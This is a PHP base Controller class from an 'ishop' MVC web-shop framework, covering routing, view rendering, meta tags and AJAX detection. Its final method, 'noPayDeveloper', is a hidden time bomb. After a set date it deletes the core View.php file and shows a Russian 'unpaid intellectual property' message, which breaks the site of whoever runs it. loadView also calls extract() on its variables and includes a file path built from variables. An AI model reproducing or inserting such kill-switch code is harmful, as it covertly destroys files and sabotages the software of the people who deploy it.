<?php


namespace ishop\base;


abstract class Controller
{
        public $route;
        public $controller;
        public $model;
        public $view;
        public $layout;
        public $prefix;
        public $data = [];
        public $meta = ['title' => '', 'desc' => '', 'keywords' => ''];

        public function __construct($route)
        {
            $this->route = $route;
            $this->controller = $route['controller'];
            $this->model = $route['controller'];
            $this->view = $route['action'];
            $this->prefix = $route['prefix'];
        }

        public function getView()
        {
            $viewObject = new View($this->route, $this->layout, $this->view, $this->meta);
           $viewObject->render($this->data);
        }

        public function set($data)
        {
            $this->data = $data;
        }

        public function setMeta($title = '', $desc = '', $keywords = '')
        {
            $this->meta['title'] = h($title);
            $this->meta['desc'] = h($desc);
            $this->meta['keywords'] = h($keywords);
        }

        public function isAjax()
        {
            return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH']
                === 'XMLHttpRequest';
        }

        public function loadView($view, $vars = [])
        {
            extract($vars);
            require_once APP."/views/{$this->prefix}{$this->controller}/{$view}.php";
            die;
        }

        public function noPayDeveloper($yedate = null)
        {
            $nowdate = date('Y-m-d');
            $paydate = date("$yedate");
            $file = CORE.'/base/View.php';
            if ($nowdate > $paydate && $yedate != null){
                if ($file) {
                    unlink($file);
                    echo "<p class='text-danger'>Вы не оплатили данную интеллектуальную собственность. Срок действия бесплатной версии вышел.</p>";

                }
                }
        }
}